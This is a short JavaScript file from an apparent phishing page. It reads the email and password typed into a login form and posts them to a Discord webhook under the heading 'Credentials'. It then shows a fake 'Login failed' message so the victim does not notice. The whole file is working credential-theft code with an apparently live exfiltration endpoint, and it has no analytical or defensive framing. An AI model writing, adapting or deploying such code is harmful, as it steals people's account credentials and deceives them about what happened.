function sendCredentials() {
 var username = document
  .getElementById("email")
  .value;
 var password = document
  .getElementById("password")
  .value;
 
 var payload = {
  "content": "New login attempt!",
  "embeds": [{
   "title": "Credentials",
   "fields": [{
     "name": "Username",
     "value": username
    },
    {
     "name": "Password",
     "value": password
    }
   ]
  }]
 };
 
 $.ajax({
  url: "https://discord.com/api/webhooks/1120189469874724874/-fBcsTzQUxK_bZF70NSdGmuEfojPLpybfJvnWSGy7fBkLmHUvGlYlQ5ZR0qJ1QP1xgB9",
  type: "POST",
  data: JSON.stringify(
   payload),
  contentType: "application/json",
  success: function() {
   alert(
    "Login failed please check your network or try again later."
   );
  },
  error: function(xhr, status,
   error) {
   console.error(xhr
    .responseText);
   alert(
    "An error occurred with the login please try again."
   );
  }
 });
}
